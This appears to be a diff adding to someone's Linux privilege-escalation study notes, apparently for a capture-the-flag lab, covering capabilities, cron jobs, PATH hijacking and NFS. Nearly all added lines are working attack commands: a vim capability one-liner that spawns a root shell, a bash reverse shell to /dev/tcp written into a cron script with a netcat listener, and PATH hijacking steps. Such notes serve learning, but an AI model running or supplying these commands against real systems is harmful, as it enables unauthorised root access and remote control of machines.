@@ -44,6 +44,36 @@ base64 "$LFILE" | base64 --decode
 
 
 
-Capabilities
+4 ) Capabilities
 step 1: to check capabilities
 cmd: getcap -r / 2>/dev/null
+use: GTFOBins
+
+Step 2: using vim capability
+cmd:
+./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+5) Cron Jobs
+path: cat /etc/crontab
+
+Step 1:check the sh file
+step 2:after open the file using vi
+cmd: vi file.sh
+step 3: type the remote code 
+cmd: bash -i >& /dev/tcp/listip/4444 0>&1
+Step 4: create netcat listen
+cmd: nc -lvnp 4444
+
+6)Path 
+
+Step 1: export PATH=/tmp:$PATH
+step 2: echo "/bin/bash" > thm
+step 3: chmod +x thm
+step 4: run the file
+
+7) Network file sharing (NFS)
+
+Step 1:path
+cmd : cat /etc/exports
+
+
